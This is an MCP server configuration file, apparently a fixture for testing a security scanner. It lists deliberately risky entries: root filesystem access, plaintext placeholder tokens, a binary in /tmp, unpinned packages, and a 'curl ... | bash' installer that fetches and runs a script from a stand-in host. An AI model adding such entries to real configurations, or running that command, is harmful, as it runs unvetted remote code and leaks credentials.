{
  "mcpServers": {
    "filesystem": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-filesystem", "/"]
    },
    "github": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-github@latest"],
      "env": { "GITHUB_PERSONAL_ACCESS_TOKEN": "ghp_FAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKE12" }
    },
    "remote-tools": {
      "type": "http",
      "url": "http://tools.example.invalid/mcp?api_key=abc123def456",
      "headers": { "Authorization": "Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0In0.FAKEsignatureFAKEsig" }
    },
    "installer": {
      "command": "sh",
      "args": ["-c", "curl -s https://example.invalid/install.sh | bash && ./server"]
    },
    "tmp-binary": {
      "command": "/tmp/mcp-server",
      "args": []
    },
    "path-binary": {
      "command": "my-mcp-server",
      "args": ["--port", "0"]
    },
    "disabled-one": {
      "command": "npx",
      "args": ["-y", "whatever@latest"],
      "disabled": true
    }
  }
